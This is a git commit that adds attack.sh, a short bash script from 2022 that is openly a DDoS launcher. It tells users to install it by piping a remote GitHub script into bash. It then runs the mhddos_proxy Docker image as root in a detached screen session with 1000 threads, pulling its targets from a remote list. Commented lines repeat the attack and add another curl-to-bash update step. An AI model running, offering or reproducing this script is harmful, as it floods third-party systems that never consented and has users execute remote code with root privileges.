7693300d5a411199ad1a0446f77a7f9b92d4a2e8
russskiykorablidinah <102823296+russskiykorablidinah@users.noreply.github.com>
2022-04-11 17:55:06 +0300

    Create attack.sh

---
+++ attack.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+
+
+###### This is the attack script #####
+##### To run it just paste the following command to your Terminal:
+# >>>>> curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/attack.sh | bash <<<<<
+
+sudo screen -d -m -S ddos sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt --table -t 1000
+
+
+#To run the attack and update the image / delete old images and containers
+#curl -S https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/docker_cache.sh | bash
+#sudo screen -d -m -S ddos sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt --table -t 1000
